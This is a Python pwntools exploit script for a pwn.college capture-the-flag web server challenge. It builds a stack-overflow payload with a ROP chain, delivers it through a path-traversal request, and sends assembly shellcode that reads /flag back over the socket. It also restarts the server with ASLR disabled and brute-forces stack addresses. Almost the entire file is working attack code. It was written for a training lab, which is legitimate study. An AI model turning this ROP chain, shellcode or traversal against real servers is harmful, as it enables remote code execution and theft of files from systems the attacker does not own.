#!/usr/bin/env python3
"""
Wily Webserver exploit v3 — Simple ROP + .bss staging

ROP chain (no stack address knowledge needed beyond CONTENT):
  pop rdi; ret      @ 0x401e73  → rdi=4 (client fd)
  pop rsi;pop r15;ret @ 0x401e71  → rsi=BSS, r15=junk
  read@plt          @ 0x401230  → read(4, BSS, rdx) where rdx ≈ 8318 (post-write residual)
  BSS+8              @ 0x404808  → pivot to stage2 in .bss (after read fills it)

After read(4, BSS, N) pulls stage2 from socket:
  - Server ret's to BSS+8
  - Stage2 shellcode: open/read/write /flag → client
"""
from pwn import *
context.arch = "amd64"
context.log_level = "warn"
import os, sys, time

# ── Constants ──
H1 = b"HTTP/1.1 200 OK\nServer: pwnserver/1.33333333333333333333333333333.7\nX-Leetness-Level: 9001\nContent-type: "
CT = b"text/plain\n"
FS = 8180
hs = len(H1) + len(CT) + len(b"Content-Length: " + str(FS).encode() + b"\n") + 1
RBP_OFF = 8200 - hs
RET_OFF = 8208 - hs

# Gadgets
POP_RDI_RET     = 0x401E73
POP_RSI_R15_RET = 0x401E71
READ_PLT        = 0x401230
BSS             = 0x404800

# Stage 2 shellcode (runs in .bss): open/read/write /flag
STAGE2 = asm("""
    xor eax,eax; push rax
    movabs rax,0x67616c662f; push rax
    mov rdi,rsp; xor eax,eax; mov al,2; xor esi,esi; syscall
    test rax,rax; js done
    mov edi,eax; xor eax,eax
    mov esi,0x404900; mov edx,200; syscall
    mov edx,eax; xor eax,eax; mov al,1; mov edi,4
    mov esi,0x404900; syscall
done:
    xor edi,edi; mov eax,60; syscall
""")


def build_stage1(content_addr):
    """Build overflow payload with ROP chain."""
    p = bytearray(FS)

    # saved_rbp → self-referential pivot
    p[RBP_OFF : RBP_OFF + 8] = p64(content_addr + 8200)

    # ROP chain starts at ret_addr
    off = RET_OFF
    p[off : off + 8] = p64(POP_RDI_RET);      off += 8
    p[off : off + 8] = p64(4);                off += 8  # rdi = client fd
    p[off : off + 8] = p64(POP_RSI_R15_RET);  off += 8
    p[off : off + 8] = p64(BSS);              off += 8  # rsi = buffer
    p[off : off + 8] = p64(0);                off += 8  # r15 = junk
    p[off : off + 8] = p64(READ_PLT);         off += 8  # call read(4, BSS, rdx)
    p[off : off + 8] = p64(BSS + 8);          off += 8  # ret to stage2

    return bytes(p)


def req(path, timeout=5):
    try:
        s = remote("127.0.0.1", 80, timeout=timeout)
        s.send(f"GET /{path} HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n".encode())
        d = s.recvall(timeout=timeout)
        s.close()
        return d
    except:
        return None


def restart():
    os.system("fuser -k 80/tcp 2>/dev/null; sleep 1")
    os.system("nohup setarch x86_64 -R /challenge/integration-web-overflow >/dev/null 2>&1 &")
    for _ in range(15):
        time.sleep(0.5)
        if req("hacker_manifesto.txt", timeout=3):
            return True
    return False


def exploit(content_addr):
    """Returns flag string or None."""
    payload = build_stage1(content_addr)
    open("/tmp/pwn", "wb").write(payload)

    try:
        s = remote("127.0.0.1", 80, timeout=3)
        s.send(b"GET /../../../tmp/pwn HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n")

        # Server now executes ROP → read(4, BSS, N) blocks
        time.sleep(0.3)

        # Send stage2: first 8 bytes consumed by BSS+8 pivot pop, then shellcode
        s.send(b"\x00" * 8 + STAGE2)

        r = s.recvall(timeout=3)
        s.close()

        if r and b"pwn.college{" in r:
            i = r.find(b"pwn.college{")
            j = r.find(b"}", i)
            return r[i : j + 1].decode()
    except:
        pass
    return None


# ── Main ──
if __name__ == "__main__":
    if "--brute" not in sys.argv:
        restart()
        addr = 0x7FFFF7F7D580
        print(f"[*] CONTENT={addr:#018x}")
        flag = exploit(addr)
        if flag:
            print(f"[FLAG] {flag}")
            sys.exit(0)
        print("[-] Failed. Use --brute.")
        sys.exit(1)

    print("[*] Brute force scan...")
    ranges = [
        (0x7FFFF7F7C000, 0x7FFFF7F84000),  # GDB area
        (0x7FFFF7EC0000, 0x7FFFF7F7C000),  # below GDB
        (0x7FFFFFFDE000, 0x7FFFFFFFF000),  # classic stack top
        (0x7FFFFFFB0000, 0x7FFFFFFDE000),
    ]

    for lo, hi in ranges:
        print(f"[*] {lo:#x} - {hi:#x}")
        for addr in range(lo, hi, 0x1000):
            restart()
            flag = exploit(addr)
            if flag:
                print(f"\n[+] CONTENT={addr:#018x}")
                print(f"[FLAG] {flag}")
                sys.exit(0)
            if addr % 0x40000 == 0:
                print(f"    {addr:#018x}...")
    print("[-] No hit")
